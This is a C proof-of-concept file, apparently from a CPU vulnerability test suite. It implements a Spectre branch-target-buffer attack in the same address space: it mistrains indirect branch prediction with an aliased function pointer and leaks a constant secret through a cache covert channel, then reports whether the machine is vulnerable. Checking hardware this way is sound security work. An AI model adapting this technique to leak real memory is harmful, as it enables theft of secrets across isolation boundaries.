#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include <sched.h>

#include "libcache/cache.h"
#include "lib/global.h"

#define SECRET 'S'

int mistrain_ = 250;
int handling = 0;

static jmp_buf buf;

// Handle segfaults
static void segfault_handler(int signum)
{
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(buf, 1);
}

void dummy()
{
    return;
}

void dump_secret()
{
    // Encode data in the covert channel
    cache_encode(SECRET);
}

int main(int argc, const char **argv)
{
    PREPARE();
    // install signal handler
    signal(SIGSEGV, segfault_handler);

    // Flush our shared memory
    flush_shared_memory();
    mfence();

    void (*mistrain)();
    void (*dump)();
    mistrain = dump_secret;
    // clear the high bits of dump_secret
    dump = (void (*)())(0x000000FFFFFF & (size_t)dump_secret);
    // set the high bits to something and set the low bits to dump_scret, we only care about the low bits in BTB indexing
    dump = (void (*)())(0x123321000000 | (size_t)dump);
    // We now have a function pointer to a function with the same 23 LSB as our leak function
    start_time = time(NULL);
    int k;
    for (k = 0; k < MAX_TRY_TIMES; k++)
    {
        // Mistrain by calling mistrain (dump_secret) function
        int i;
        for (i = 0; i < 2500; i++)
            mistrain();

        // Flush our shared memory
        flush_shared_memory();
        mfence();
        nospec();

        if (handling)
        {
            // Call predicted function
            dump();
        }

        // Previous call will fail, so after every fault we return here
        if (!setjmp(buf))
        {
            handling = 1;
        }

        // Recover data from the covert channel
        if (cache_decode() == 'S')
        {
            passed_count++;
        }
        if (time(NULL) - start_time > timeout)
        {
            printf(ANSI_COLOR_YELLOW "Spectre_BTB_sa_oop: Timeout" ANSI_COLOR_RESET "\n");
            exit(-1);
        }
    }
    int exit_result = 0;
    if (passed_count > 0)
    {
        printf(ANSI_COLOR_RED "Spectre_BTB_sa_oop: Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_SUCCESS;
    }
    else
    {
        printf(ANSI_COLOR_GREEN "Spectre_BTB_sa_oop: Not Vulnerable" ANSI_COLOR_RESET "\n");
        exit_result = EXIT_FAILURE;
    }
    exit(exit_result);
}
